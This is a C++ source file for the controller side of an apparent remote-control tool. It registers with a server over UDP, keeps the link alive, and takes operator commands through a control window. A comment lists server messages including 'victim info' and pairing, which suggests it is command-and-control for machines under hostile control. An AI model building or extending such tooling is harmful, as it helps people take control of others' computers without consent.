#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include <iostream>
#include <thread>
#include <sstream>
#include <Windows.h>
#include "controller.h"

/* possible messages form server:
c: controller accepted
n: controller info
l: victim info
e: clear clients list
d: display clients list
p: paired with 
*/

int main()
{	
    auto sendRs = [](sf::UdpSocket& s) {
        while (true)
        {
            Mlib::sleep(2000);
            s.send("r", 1, SERVER_IP, SERVER_PORT);
        }
    };  

    sf::UdpSocket ard;
    ard.bind(sf::Socket::AnyPort);
    size_t size;
    sf::IpAddress ip;
    unsigned short port;
    char buf[1];
    do {    
        std::string init = "c" + std::to_string(int(Mlib::getTime() / 1000));
        ard.send(init.c_str(), init.size(), SERVER_IP, SERVER_PORT);
        ard.receive(buf, sizeof(buf), size, ip, port);
    } while (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'c');
    std::thread stayAwake(sendRs, std::ref(ard));

    std::cout << "started connection with server\n";
    Controller controller(&ard);
    std::thread receive(&Controller::receiveInfo, &controller);
    std::thread input(&Controller::takeCmdInput, &controller);

    controller.controlWindow();

	return 0;
}	